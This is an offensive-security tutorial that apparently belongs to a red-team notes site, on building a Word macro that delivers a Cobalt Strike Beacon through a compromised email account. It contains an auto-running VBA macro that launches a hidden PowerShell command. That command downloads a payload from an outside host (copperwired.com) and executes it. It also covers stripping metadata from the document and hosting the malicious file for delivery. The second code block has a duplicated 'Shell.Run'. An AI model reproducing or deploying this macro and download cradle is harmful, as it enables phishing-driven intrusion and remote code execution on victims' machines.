# VBA Macro Beacon

## Introduction

If we've compromised a users email we've opened a door to many possibilities. We can search the users emails, discover new users, reveal technologies in place, and send email on behalf of the user. Note: files that are emailed internally are not tagged with [MOTW Zone Identifier](https://en.wikipedia.org/wiki/Mark\_of\_the\_Web).

Visual Basic for Applications (VBA) is commonly used to enhance functionality in Excel and Word.&#x20;

### VBA Beacon Macro

We can create a macro in word by going View -> Macros -> Create.&#x20;

```vba
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "notepad"

End Sub
```

#### Create Beacon PowerShell payload.

The easiest way to get a Beacon through a VBA macro is to use a PowerShell Beacon. To do so, go to Attacks -> Scripted Web Delivery (S). After that, generate a PowerShell payload & copy and paste it.

<figure><img src="../../../.gitbook/assets/Screenshot 2024-07-25 at 12.48.22 AM.png" alt="" width="375"><figcaption></figcaption></figure>

Next, copy the PowerShell payload to the VBA Macro

```vba
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run Shell.Run "powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://copperwired.com/a'))"""

End Sub
```

Save the Macro, return the Word and go File -> Info -> Inspect Document. Remove _Document Properties and Personal Information._ This will prevent out username and other information from being leaked.

<figure><img src="../../../.gitbook/assets/Screenshot 2024-07-25 at 12.55.46 AM.png" alt=""><figcaption></figcaption></figure>

Next we'll save it. It's important to save the Macro as a `.doc` instead of `.docx`. This is because .docx does not allow Macros. Additionally, you can use `.docm` but that's not really what we're looking for.

<figure><img src="../../../.gitbook/assets/Screenshot 2024-07-25 at 1.05.09 AM.png" alt=""><figcaption></figcaption></figure>

We'll upload this file to our Cobalt Strike team server. Go to Site Management -> Host File and select our new `.doc` file.
